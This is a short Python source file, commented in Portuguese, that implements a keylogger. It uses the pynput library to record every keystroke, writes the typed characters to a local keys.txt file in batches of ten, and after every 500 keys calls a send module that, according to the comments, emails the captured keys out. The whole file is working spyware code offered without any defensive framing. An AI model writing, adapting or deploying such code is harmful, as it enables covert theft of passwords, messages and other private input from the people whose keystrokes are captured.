#Imports das teclas
import pynput
from pynput.keyboard import Key, Listener

#Import do enviador
import send

#Iniciando dois contadores e umas lista para armazenar as 10 últimas keys
count = 0
maxcount = 0
keys = []

#Função para ser exercida a cada tecla pressionada
def on_press(key):
    #Incrementa os contadores e adiciona a tecla a lista
    global keys, count, maxcount
    keys.append(key)
    count+=1
    maxcount+=1

    #Caso o primeiro contador seja maior que 10, ele zera e as teclas são adicionadas em um txt
    if(count>=10):
        count = 0
        write_file(keys)
        keys = []
    #Caso o segundo contador seja maior que 500, ele zera e é envia um email com as keys digitadas
    if (maxcount >= 500):
        maxcount = 0
        send.send_keys()

#Função para ser exercida na hora de salvar as teclas
def write_file(keys):
    #Coletar todas as teclas da lista e remover as ' entre elas
    with open("keys.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            #Caso espaço seja a última tecla, adicionar um espaço no txt
            if(k.find("space") > 0):
                f.write(' ')
            #Caso não seja uma tecla de ação, adicioná-la no arquivo
            elif(k.find("Key") == -1):
                f.write(k)

#Iniciar o listener (que captura as teclas)
with Listener(on_press=on_press) as listener:
    listener.join()
